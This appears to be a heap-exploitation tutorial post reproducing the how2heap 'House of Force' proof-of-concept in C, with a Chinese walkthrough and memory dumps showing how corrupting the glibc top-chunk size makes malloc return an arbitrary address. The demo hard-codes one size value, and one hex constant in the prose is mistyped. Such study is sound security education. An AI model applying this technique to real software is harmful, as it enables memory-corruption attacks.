---
title: how2heap - house of force
categories:
  - how2heap
tags: null
published: true
---

# Overview

- [house_of_force](https://github.com/shellphish/how2heap/blob/master/house_of_force.c)

```c
/*

   This PoC works also with ASLR enabled.
   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.
   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum 
   ( http://phrack.org/issues/66/10.html )

   Tested in Ubuntu 14.04, 64bit.

*/


#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

char bss_var[] = "This is a string that we want to overwrite.";

int main(int argc , char* argv[])
{
	fprintf(stderr, "\nWelcome to the House of Force\n\n");
	fprintf(stderr, "The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n");
	fprintf(stderr, "The top chunk is a special chunk. Is the last in memory "
		"and is the chunk that will be resized when malloc asks for more space from the os.\n");

	fprintf(stderr, "\nIn the end, we will use this to overwrite a variable at %p.\n", bss_var);
	fprintf(stderr, "Its current value is: %s\n", bss_var);



	fprintf(stderr, "\nLet's allocate the first chunk, taking space from the wilderness.\n");
	intptr_t *p1 = malloc(256);
	fprintf(stderr, "The chunk of 256 bytes has been allocated at %p.\n", p1);

	fprintf(stderr, "\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n");
	int real_size = malloc_usable_size(p1);
	fprintf(stderr, "Real size (aligned and all that jazz) of our allocated chunk is %d.\n", real_size);

	fprintf(stderr, "\nNow let's emulate a vulnerability that can overwrite the header of the Top Chunk\n");

	//----- VULNERABILITY ----
	intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size);
	fprintf(stderr, "\nThe top chunk starts at %p\n", ptr_top);

	fprintf(stderr, "\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n");
	fprintf(stderr, "Old size of top chunk %#llx\n", *((unsigned long long int *)ptr_top));
	ptr_top[0] = -1;
	fprintf(stderr, "New size of top chunk %#llx\n", *((unsigned long long int *)ptr_top));
	//------------------------

	fprintf(stderr, "\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n"
	   "Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n"
	   "overflow) and will then be able to allocate a chunk right over the desired region.\n");

	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*2 - (unsigned long)ptr_top;
	fprintf(stderr, "\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n"
	   "we will malloc %#lx bytes.\n", bss_var, ptr_top, evil_size);
	void *new_ptr = malloc(-4288);
	fprintf(stderr, "As expected, the new pointer is at the same place as the old top chunk: %p\n", new_ptr);

	void* ctr_chunk = malloc(100);
	fprintf(stderr, "\nNow, the next chunk we overwrite will point at our target buffer.\n");
	fprintf(stderr, "malloc(100) => %p!\n", ctr_chunk);
	fprintf(stderr, "Now, we can finally overwrite that value:\n");

	fprintf(stderr, "... old string: %s\n", bss_var);
	fprintf(stderr, "... doing strcpy overwrite with \"YEAH!!!\"...\n");
	strcpy(ctr_chunk, "YEAH!!!");
	fprintf(stderr, "... new string: %s\n", bss_var);


	// some further discussion:
	//fprintf(stderr, "This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n");
	//fprintf(stderr, "This because the main_arena->top pointer is setted to current av->top + malloc_size "
	//	"and we \nwant to set this result to the address of malloc_got_address-8\n\n");
	//fprintf(stderr, "In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n");
	//fprintf(stderr, "The av->top after this big malloc will be setted in this way to malloc_got_address-8\n\n");
	//fprintf(stderr, "After that a new call to malloc will return av->top+8 ( +8 bytes for the header ),"
	//	"\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n");

	//fprintf(stderr, "The large chunk with evil_size has been allocated here 0x%08x\n",p2);
	//fprintf(stderr, "The main_arena value av->top has been setted to malloc_got_address-8=0x%08x\n",malloc_got_address);

	//fprintf(stderr, "This last malloc will be served from the remainder code and will return the av->top+8 injected before\n");
}
```

# House Of Force

这项攻击的思路是覆盖 top chunk 然后 malloc 返回一个任意指针。top chunk 是一个特殊的存在，位于 heap 的底部，它
不属于任何 bin，当有超过其大小的请求时系统会分配更多的内存空间。

程序有一个已初始化静态变量，

```c
    char bss_var[] = "This is a string that we want to overwrite.";
```

首先 malloc 一块内存，

```c
    intptr_t *p1 = malloc(256);


0x603000:   0x00000000  0x00000000  0x00000111  0x00000000
0x603010:   0x00000000  0x00000000  0x00000000  0x00000000
0x603020:   0x00000000  0x00000000  0x00000000  0x00000000
0x603030:   0x00000000  0x00000000  0x00000000  0x00000000
0x603040:   0x00000000  0x00000000  0x00000000  0x00000000
0x603050:   0x00000000  0x00000000  0x00000000  0x00000000
0x603060:   0x00000000  0x00000000  0x00000000  0x00000000
0x603070:   0x00000000  0x00000000  0x00000000  0x00000000
0x603080:   0x00000000  0x00000000  0x00000000  0x00000000
0x603090:   0x00000000  0x00000000  0x00000000  0x00000000
0x6030a0:   0x00000000  0x00000000  0x00000000  0x00000000
0x6030b0:   0x00000000  0x00000000  0x00000000  0x00000000
0x6030c0:   0x00000000  0x00000000  0x00000000  0x00000000
0x6030d0:   0x00000000  0x00000000  0x00000000  0x00000000
0x6030e0:   0x00000000  0x00000000  0x00000000  0x00000000
0x6030f0:   0x00000000  0x00000000  0x00000000  0x00000000
0x603100:   0x00000000  0x00000000  0x00000000  0x00000000
0x603110:   0x00000000  0x00000000  0x00020ef1  0x00000000
0x603120:   0x00000000  0x00000000  0x00000000  0x00000000
0x603130:   0x00000000  0x00000000  0x00000000  0x00000000
```

模拟溢出，改写 top chunk，

```c
    int real_size = malloc_usable_size(p1);
    intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size);

    ptr_top[0] = -1;

0x603110:   0x00000000  0x00000000  0xffffffff  0xffffffff
0x603120:   0x00000000  0x00000000  0x00000000  0x00000000
```

虽然赋值为 `-1`，但是依照补码的原理 `-1` 即表示为 `0xffffffff`，在内存中做比较时该值为最大。

假设我们需要返回地址为 P，那么请求 `P - &top_chunk` 大小的 chunk，top chunk 将会被返回给用户，当 P 在 top chunk
前面时，用补码表示负数的值会很大，便会发生整数溢出(chunk_at_offset(p, s)  #malloc:1313)，P 成为新的 top chunk。

```c
	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*2 - (unsigned long)ptr_top;
    
	void *new_ptr = malloc(evil_size);
```

这里我们希望的返回地址为 0x602060，那么 chunk 地址便为 0x602060-0x10 = 0x602050，`evil_size` 的值便是：
`0x602050 - 0x603110 = 0xffffffffffffef40`，remainder chunk 等于 chunk_at_offset：&top_chunk + size，那么
`0x603110 + 0xfffffffffffef40` 则会发生整数溢出，其结果为 `0x602050`。

运行结果：

![house_of_force]({{ site.baseurl }}/images/house_of_force.png)
